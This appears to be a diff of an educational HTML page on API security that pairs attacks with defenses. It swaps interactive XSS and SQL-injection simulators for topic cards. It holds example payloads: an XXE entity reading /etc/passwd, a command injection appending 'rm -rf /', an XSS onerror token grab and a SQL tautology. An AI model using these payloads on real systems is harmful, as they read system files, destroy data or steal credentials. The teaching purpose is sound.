+                    <p class="topic-desc">Uploading malicious XML containing external system entities (<code>&lt;!ENTITY x SYSTEM "file:///etc/passwd"&gt;</code>) forcing parsers to leak files.</p>
+                    <div class="topic-fix">Defense: Completely disable DTD (Document Type Definition) processing in XML parsers.</div>
+                </div>
+
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">17. Command Injection</div><span class="topic-badge badge-ro">RCE Shell</span></div>
+                    <p class="topic-desc">Passing untrusted input directly to OS system shell commands (<code>exec("ping " + ip)</code>). Attacker inputs <code>127.0.0.1; rm -rf /</code>.</p>
+                    <div class="topic-fix">Defense: Never execute shell interpreters. Pass command arguments as separate array elements.</div>
+                </div>
+
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">18. Man-in-the-Middle (MITM)</div><span class="topic-badge badge-ro">Network</span></div>
+                    <p class="topic-desc">Intercepting unencrypted network packets on Wi-Fi routers to steal HTTP Authorization headers and plaintext tokens.</p>
+                    <div class="topic-fix">Defense: Enforce HTTP Strict Transport Security (HSTS) and mandatory TLS 1.3 across all routes.</div>
+                </div>
+
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">19. Replay Attack</div><span class="topic-badge badge-ro">Network</span></div>
+                    <p class="topic-desc">Intercepting a valid signed API request and resending it multiple times to execute duplicate financial transfers.</p>
+                    <div class="topic-fix">Defense: Include unique request nonces and expiration timestamps verified in idempotency stores.</div>
+                </div>
+
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">20. DoS / DDoS</div><span class="topic-badge badge-ro">Availability</span></div>
+                    <p class="topic-desc">Flooding API endpoints with millions of requests per second to exhaust database connection pools or CPU memory.</p>
+                    <div class="topic-fix">Defense: Implement Token Bucket rate limiters and deploy Web Application Firewalls (WAF).</div>
                 </div>
             </div>
         </div>
 
-        <!-- LEVEL 4: XSS, CSRF & CORS -->
-        <div class="level-content" id="lvl-4">
-            <div class="card">
-                <h2>Level 5: XSS Sandbox, CSRF & CORS</h2>
-                
-                <div class="sandbox">
-                    <h3>⚡ Live XSS Attack & Sanitization Simulator</h3>
-                    <p>Enter comment containing script tags: <code>&lt;img src="x" onerror="alert('Stolen Cookie!')"&gt;</code></p>
-                    <div class="form-row">
-                        <input type="text" id="xssInput" value="<img src='x' onerror='alert(\"🚨 XSS ATTACK! Stolen Token: \" + localStorage.getItem(\"secret_token\"))'>" style="background:#0b0b16;border:1px solid var(--brd2);color:#fff;padding:12px;border-radius:8px;flex:1;font-family:'JetBrains Mono',monospace;">
-                        <button class="btn" onclick="runXSS(false)">Render Unprotected DOM</button>
-                        <button class="btn" style="background:var(--em);" onclick="runXSS(true)">Render with Output Sanitization</button>
-                    </div>
-                    <div class="out-box" id="xssOutput">Simulated rendering output will appear here.</div>
+        <!-- STEP 3: AUTH & IDENTITY -->
+        <div class="step-content" id="s-2">
+            <h2 style="color:var(--vi);font-size:1.8rem;font-weight:900;margin-bottom:20px;">🔐 Step 3: Auth & Identity — Who Are You & What Can You Do</h2>
+            
+            <div class="grid-cards">
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">21. JWT Internals</div><span class="topic-badge badge-vi">Tokens</span></div>
+                    <p class="topic-desc">Self-contained stateless cryptographic tokens (`header.payload.sig`). Avoid `jwt.decode()` trap; always enforce cryptographic signature checks.</p>
+                    <div class="topic-fix">Defense: Always use `jwt.verify(token, secret)` and store tokens in HttpOnly cookies.</div>
                 </div>
 
-                <h3>CSRF & CORS Rules</h3>
-                <ul>
-                    <li><b>CSRF Defense:</b> Set cookies to <code>SameSite=Strict</code> or <code>Lax</code> and require backend synchronizer tokens for state mutations.</li>
-                    <li><b>CORS Defense:</b> Never combine wildcard origin <code>Access-Control-Allow-Origin: *</code> with credentials enabled. Explicitly whitelist trusted origins.</li>
-                </ul>
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">22. OAuth 2.0 & OIDC Flows</div><span class="topic-badge badge-vi">Delegation</span></div>
+                    <p class="topic-desc">Authorization Code Flow with PKCE (`code_verifier` + `code_challenge`) protects single-page apps from authorization code interception.</p>
+                    <div class="topic-fix">Defense: Enforce PKCE on all public client applications.</div>
+                </div>
+
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">23. RBAC vs ABAC</div><span class="topic-badge badge-vi">Access Models</span></div>
+                    <p class="topic-desc"><b>RBAC:</b> Role-Based (Admin vs User). <b>ABAC:</b> Attribute-Based (Can edit order ONLY IF `order.department == user.department`).</p>
+                    <div class="topic-fix">Defense: Combine RBAC for route access with ABAC for granular object security.</div>
+                </div>
+
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">24. Session Management</div><span class="topic-badge badge-vi">Sessions</span></div>
+                    <p class="topic-desc">Preventing session fixation and hijacking by regenerating session IDs immediately upon authentication and enforcing idle timeouts.</p>
+                    <div class="topic-fix">Defense: Use cryptographically secure random session IDs stored in HttpOnly cookies.</div>
+                </div>
+
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">25. Broken Access Control</div><span class="topic-badge badge-vi">OWASP #1</span></div>
+                    <p class="topic-desc">Missing server-side permission checks allowing regular users to execute administrative mutations (`DELETE /api/admin/users/1`).</p>
+                    <div class="topic-fix">Defense: Enforce mandatory authorization middleware on every protected endpoint.</div>
+                </div>
+
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">26. MFA / 2FA</div><span class="topic-badge badge-vi">Multi-Factor</span></div>
+                    <p class="topic-desc">Requiring two distinct factors: password + TOTP authenticator app or hardware WebAuthn security key.</p>
+                    <div class="topic-fix">Defense: Prefer FIDO2/WebAuthn passkeys over SMS 2FA to eliminate SIM swap attacks.</div>
+                </div>
+
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">27. API Key Management</div><span class="topic-badge badge-vi">B2B Auth</span></div>
+                    <p class="topic-desc">Securing machine-to-machine integrations. Never expose raw API keys in client-side code or public Git repositories.</p>
+                    <div class="topic-fix">Defense: Store hashed keys in database (SHA-256), enforce IP scoping, and rotate regularly.</div>
+                </div>
+
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">28. Password Hashing</div><span class="topic-badge badge-vi">Cryptography</span></div>
+                    <p class="topic-desc">One-way cryptographic key derivation functions intentionally consuming memory/CPU to prevent GPU brute-force attacks.</p>
+                    <div class="topic-fix">Defense: Use `Argon2id` or `bcrypt` with unique per-user random salts.</div>
+                </div>
             </div>
         </div>
 
-        <!-- LEVEL 5: RATE LIMITING & SSRF -->
-        <div class="level-content" id="lvl-5">
-            <div class="card">
-                <h2>Level 6: Broken Rate Limiting & Unrestricted Resource Consumption</h2>
-                <p>Without rate limiting, attackers can perform brute-force password guesses (1 million attempts), drain expensive AI LLM token budgets (10,000 requests), or scrape your entire database.</p>
-
-                <div class="code-box code-right">
-                    <div class="code-title"><span style="color:#10b981;">✅ Enterprise Express Rate Limiting Implementation</span></div>
-const rateLimit = require('express-rate-limit');
-
-// 1. Strict Limiter for Login Endpoints (Prevents brute-forcing)
-const loginLimiter = rateLimit({
-  windowMs: 15 * 60 * 1000, // 15 minutes window
-  max: 5,                   // Limit each IP to 5 failed login attempts
-  message: { error: 'Too many login attempts. Account temporarily locked for 15 minutes.' }
-});
-
-// 2. API Key Limiter for B2B / AI Endpoints (Prevents budget drain)
-const apiLimiter = rateLimit({
-  windowMs: 1 * 60 * 1000,  // 1 minute window
-  max: 60,                  // 60 requests per minute per API Key
-  keyGenerator: (req) => req.headers['x-api-key'] || req.ip
-});
-
-app.post('/api/login', loginLimiter, handleLogin);
-app.post('/api/ai/generate', verifyToken, apiLimiter, handleAIGeneration);
+        <!-- STEP 4: TRANSPORT & NETWORK -->
+        <div class="step-content" id="s-3">
+            <h2 style="color:var(--bl);font-size:1.8rem;font-weight:900;margin-bottom:20px;">🌐 Step 4: Transport & Network — Securing Data in Motion</h2>
+            
+            <div class="grid-cards">
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">29. TLS 1.3 Handshake</div><span class="topic-badge badge-bl">Encryption</span></div>
+                    <p class="topic-desc">The modern standard for HTTPS encryption. Eliminates obsolete ciphers and achieves secure connection handshakes in 1 round trip.</p>
+                    <div class="topic-fix">Defense: Enforce modern cipher suites and redirect all HTTP traffic to HTTPS.</div>
                 </div>
 
-                <div style="margin-top:25px;padding:20px;background:#0d0d1a;border-radius:12px;border:1px solid var(--brd2);">
-                    <h3 style="color:#ff8093;">📋 The Master API Security Checklist</h3>
-                    <table>
-                        <thead>
-                            <tr>
-                                <th>Attack Vector</th>
-                                <th>Required Engineering Fix</th>
-                            </tr>
-                        </thead>
-                        <tbody>
-                            <tr><td><b>IDOR / BOLA</b></td><td>Always scope DB queries to verified session ID (`WHERE id=? AND user_id=req.user.id`).</td></tr>
-                            <tr><td><b>Broken Access Control</b></td><td>Enforce server-side role middleware (`requireAdmin`) on every protected route.</td></tr>
-                            <tr><td><b>SQL Injection</b></td><td>Always use parameterized queries (`$1`), never string concatenation.</td></tr>
-                            <tr><td><b>Broken Rate Limiting</b></td><td>Apply `express-rate-limit` per IP/User/API-Key on all endpoints.</td></tr>
-                            <tr><td><b>JWT Manipulation</b></td><td>Enforce `jwt.verify()` with strong secrets; never use `jwt.decode()` for auth decisions.</td></tr>
-                            <tr><td><b>Exposed Endpoints</b></td><td>Require authentication on docs (`/swagger`) and remove internal/debug paths before deploy.</td></tr>
-                            <tr><td><b>Mass Assignment</b></td><td>Whitelist explicit allowed fields (`const { name } = req.body`), never spread `req.body`.</td></tr>
-                        </tbody>
-                    </table>
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">30. CORS Preflight & Rules</div><span class="topic-badge badge-bl">Origin Shield</span></div>
+                    <p class="topic-desc">Cross-Origin Resource Sharing uses browser preflight `OPTIONS` requests. Never combine wildcard `Origin: *` with credentials enabled.</p>
+                    <div class="topic-fix">Defense: Explicitly whitelist trusted frontend domains in CORS headers.</div>
+                </div>
+
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">31. Security Headers</div><span class="topic-badge badge-bl">HTTP Armor</span></div>
+                    <p class="topic-desc">Essential response headers protecting browsers: `Content-Security-Policy (CSP)`, `HSTS`, `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`.</p>
+                    <div class="topic-fix">Defense: Configure middleware (helmet.js) to inject security headers on every response.</div>
+                </div>
+
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">32. Certificate Pinning</div><span class="topic-badge badge-bl">Mobile Security</span></div>
+                    <p class="topic-desc">Embedding the exact public key hash of your server certificate inside iOS/Android apps to prevent root-CA interception.</p>
+                    <div class="topic-fix">Defense: Pin backup public keys alongside primary certs to prevent app lockouts during renewals.</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- STEP 5: API DESIGN SECURITY -->
+        <div class="step-content" id="s-4">
+            <h2 style="color:var(--cy);font-size:1.8rem;font-weight:900;margin-bottom:20px;">🛠️ Step 5: API Design Security — Building It Safe From The Start</h2>
+            
+            <div class="grid-cards">
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">33. Rate Limiting Algorithms</div><span class="topic-badge badge-cy">Resilience</span></div>
+                    <p class="topic-desc">Throttling endpoints using <b>Token Bucket</b> and <b>Sliding Window</b> counters to prevent brute-force attacks and AI token budget drain.</p>
+                    <div class="topic-fix">Standard: Return HTTP 429 Too Many Requests with `Retry-After` headers.</div>
+                </div>
+
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">34. Strict Input Validation</div><span class="topic-badge badge-cy">Schema Defense</span></div>
+                    <p class="topic-desc">Validating incoming request bodies, params, and headers against strict runtime schema allowlists (Zod / Pydantic).</p>
+                    <div class="topic-fix">Standard: Reject unknown properties and enforce strict data type and length constraints.</div>
+                </div>
+
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">35. API Versioning & Sunsetting</div><span class="topic-badge badge-cy">Lifecycle</span></div>
+                    <p class="topic-desc">Preventing breaking changes by versioning endpoints (`/api/v1/` vs `/api/v2/`) and communicating deprecation timelines.</p>
+                    <div class="topic-fix">Standard: Include RFC 8594 `Sunset` HTTP response headers on deprecated routes.</div>
+                </div>
+
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">36. Safe Error Handling</div><span class="topic-badge badge-cy">Sanitization</span></div>
+                    <p class="topic-desc">Preventing information leaks by never returning stack traces, SQL errors, or internal file paths in production HTTP responses.</p>
+                    <div class="topic-fix">Standard: Log detailed errors internally with Correlation IDs; return sanitized messages to clients.</div>
+                </div>
+
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">37. Idempotency Keys</div><span class="topic-badge badge-cy">Retry Safety</span></div>
+                    <p class="topic-desc">Preventing duplicate financial transactions during network retries by requiring clients to send unique `X-Idempotency-Key` headers.</p>
+                    <div class="topic-fix">Standard: Cache request execution results in Redis setnx for 24 hours.</div>
+                </div>
+
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">38. GraphQL Security</div><span class="topic-badge badge-cy">Query Defense</span></div>
+                    <p class="topic-desc">Preventing denial of service from deeply nested GraphQL queries (`author { books { author { books } } }`) or public introspection.</p>
+                    <div class="topic-fix">Standard: Disable introspection in production and enforce query depth limits (max depth 5).</div>
+                </div>
+
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">39. Webhook Security</div><span class="topic-badge badge-cy">Event Integrity</span></div>
+                    <p class="topic-desc">Verifying that incoming asynchronous webhook events actually originated from trusted vendors (Stripe/GitHub) rather than attackers.</p>
+                    <div class="topic-fix">Standard: Verify cryptographic HMAC signatures (`X-Stripe-Signature`) using secret webhook keys.</div>
+                </div>
+
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">40. Least Privilege Architecture</div><span class="topic-badge badge-cy">Zero Trust</span></div>
+                    <p class="topic-desc">Granting microservices, database users, and API tokens only the minimum exact permissions required to perform their function.</p>
+                    <div class="topic-fix">Standard: Never run microservices or database connections using root or superuser credentials.</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- STEP 6: DEFENSIVE TOOLS & PRACTICE -->
+        <div class="step-content" id="s-5">
+            <h2 style="color:var(--em);font-size:1.8rem;font-weight:900;margin-bottom:20px;">🛡️ Step 6: Defensive Tools & Practices — Building The Enterprise Shield</h2>
+            
+            <div class="grid-cards">
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">41. WAF (Web Application Firewall)</div><span class="topic-badge badge-em">Perimeter Shield</span></div>
+                    <p class="topic-desc">Deploying edge firewalls (Cloudflare, AWS WAF) that filter SQL injection payloads, XSS strings, and DDoS bursts before traffic hits origin servers.</p>
+                    <div class="topic-fix">Practice: Enable OWASP Core Rule Set (CRS) and bot management on perimeter proxies.</div>
+                </div>
+
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">42. Penetration Testing</div><span class="topic-badge badge-em">Security Auditing</span></div>
+                    <p class="topic-desc">Simulating real hacker attacks using interception proxies (<b>Burp Suite</b>, <b>OWASP ZAP</b>) to identify API vulnerabilities before release.</p>
+                    <div class="topic-fix">Practice: Conduct automated security scanning in CI/CD pipelines alongside annual third-party pen tests.</div>
+                </div>
+
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">43. Secrets Management</div><span class="topic-badge badge-em">Vaulting</span></div>
+                    <p class="topic-desc">Storing API keys, database credentials, and TLS certificates inside secure hardware vaults (<b>HashiCorp Vault</b>, <b>AWS Secrets Manager</b>).</p>
+                    <div class="topic-fix">Practice: Inject secrets into containers as dynamic runtime memory variables rather than static files.</div>
+                </div>
+
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">44. Security Logging & SIEM</div><span class="topic-badge badge-em">Anomaly Detection</span></div>
+                    <p class="topic-desc">Forwarding structured JSON logs to Security Information and Event Management (SIEM) systems (Datadog, Splunk) to detect intrusion anomalies.</p>
+                    <div class="topic-fix">Practice: Alert SOC teams instantly on spikes in HTTP 401/403 errors or SQL syntax anomalies.</div>
+                </div>
+
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">45. OWASP API Top 10</div><span class="topic-badge badge-em">Industry Standard</span></div>
+                    <p class="topic-desc">The industry benchmark checklist summarizing the 10 most critical API security risks (BOLA, Broken Auth, Mass Assignment, etc.).</p>
+                    <div class="topic-fix">Practice: Require all full-stack engineers to review the OWASP API Top 10 during onboarding.</div>
+                </div>
+
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">46. Threat Modelling (STRIDE)</div><span class="topic-badge badge-em">Design Auditing</span></div>
+                    <p class="topic-desc">Evaluating architectures using the STRIDE framework: <b>S</b>poofing, <b>T</b>ampering, <b>R</b>epudiation, <b>I</b>nfo disclosure, <b>D</b>oS, <b>E</b>levation of privilege.</p>
+                    <div class="topic-fix">Practice: Perform STRIDE threat modeling workshops before writing code for new features.</div>
+                </div>
+
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">47. Security Code Review</div><span class="topic-badge badge-em">Pull Requests</span></div>
+                    <p class="topic-desc">Auditing Pull Requests specifically for security regressions: missing auth middleware, raw string queries, or unvalidated user inputs.</p>
+                    <div class="topic-fix">Practice: Use automated SAST (Static Application Security Testing) tools like SonarQube or Semgrep in PR checks.</div>
+                </div>
+
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">48. Incident Response</div><span class="topic-badge badge-em">Containment</span></div>
+                    <p class="topic-desc">Having a documented operational runbook defining exactly who to call, how to isolate compromised servers, and how to revoke breached tokens during an attack.</p>
+                    <div class="topic-fix">Practice: Conduct quarterly breach tabletop simulations to verify incident escalation procedures.</div>
                 </div>
             </div>
         </div>
     </div>
 
     <script>
-        localStorage.setItem("secret_token", "JWT_SECRET_ADMIN_TOKEN_9912");
-
-        function switchLevel(idx) {
-            document.querySelectorAll('.l-tab').forEach((t, i) => t.classList.toggle('on', i === idx));
-            document.querySelectorAll('.level-content').forEach((c, i) => c.classList.toggle('on', i === idx));
+        function switchStep(idx, color) {
+            document.querySelectorAll('.s-tab').forEach((t, i) => {
+                t.className = 's-tab';
+                if (i === idx) t.classList.add('on-' + color);
+            });
+            document.querySelectorAll('.step-content').forEach((c, i) => c.classList.toggle('on', i === idx));
         }
-
-        function base64UrlEncode(str) {
-            return btoa(unescape(encodeURIComponent(str))).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
-        }
-
-        function encodeJWT() {
-            try {
-                let h = base64UrlEncode(document.getElementById('jwtHeader').value);
-                let p = base64UrlEncode(document.getElementById('jwtPayload').value);
-                let s = base64UrlEncode("simulated_hmac_signature_" + document.getElementById('jwtSecret').value + h + p);
-                document.getElementById('outHeader').innerText = h;
-                document.getElementById('outPayload').innerText = p;
-                document.getElementById('outSig').innerText = s;
-            } catch(e) {}
-        }
-
-        function runSQLi(isSecure) {
-            let u = document.getElementById('sqliUser').value || 'admin';
-            let out = document.getElementById('sqliOutput');
-            if (!isSecure) {
-                let rawSQL = `SELECT * FROM users WHERE username = '${u}' AND status = 'active';`;
-                if (u.includes("' OR '1'='1")) {
-                    out.innerHTML = `❌ <span style="color:#ff5f56;">VULNERABLE QUERY EXECUTED:</span>\n${rawSQL}\n\n🚨 ATTACK SUCCESSFUL! The condition ('1'='1') is ALWAYS TRUE! Returned ALL 14,200 user records including admin passwords!`;
-                } else {
-                    out.innerHTML = `⚠️ <span style="color:#f59e0b;">RAW CONCATENATED QUERY EXECUTED:</span>\n${rawSQL}\n\nResult: Looked up single user '${u}'.`;
-                }
-            } else {
-                let prepSQL = `SELECT * FROM users WHERE username = $1 AND status = 'active';  -- Params: [$1 = "${u}"]`;
-                out.innerHTML = `🛡️ <span style="color:#10b981;">SECURE PREPARED STATEMENT EXECUTED:</span>\n${prepSQL}\n\n✅ BLOCKED! The database engine treated "${u}" strictly as a literal string value, preventing query logic hijacking!`;
-            }
-        }
-
-        function runXSS(isSecure) {
-            let val = document.getElementById('xssInput').value;
-            let out = document.getElementById('xssOutput');
-            if (!isSecure) {
-                out.innerHTML = `❌ <span style="color:#ff5f56;">UNPROTECTED DOM RENDERING:</span>\nAttempting to insert HTML directly into document...\n\n`;
-                if (val.includes("<img") || val.includes("<script")) {
-                    alert("🚨 XSS EXPLOIT TRIGGERED! Stolen Token: " + localStorage.getItem("secret_token"));
-                    out.innerHTML += `🚨 ATTACK SUCCESSFUL! The browser executed the injected JavaScript tag and popped up an alert displaying stored tokens!`;
-                } else {
-                    out.innerHTML += `Rendered: ${val}`;
-                }
-            } else {
-                let clean = val.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;");
-                out.innerHTML = `🛡️ <span style="color:#10b981;">SANITIZED & ENCODED DOM OUTPUT:</span>\n${clean}\n\n✅ BLOCKED! HTML entities were escaped (< became &lt;), forcing the browser to display the tag as plain harmless text rather than executable code!`;
-            }
-        }
-
-        encodeJWT();
     </script>
 </body>
 </html>
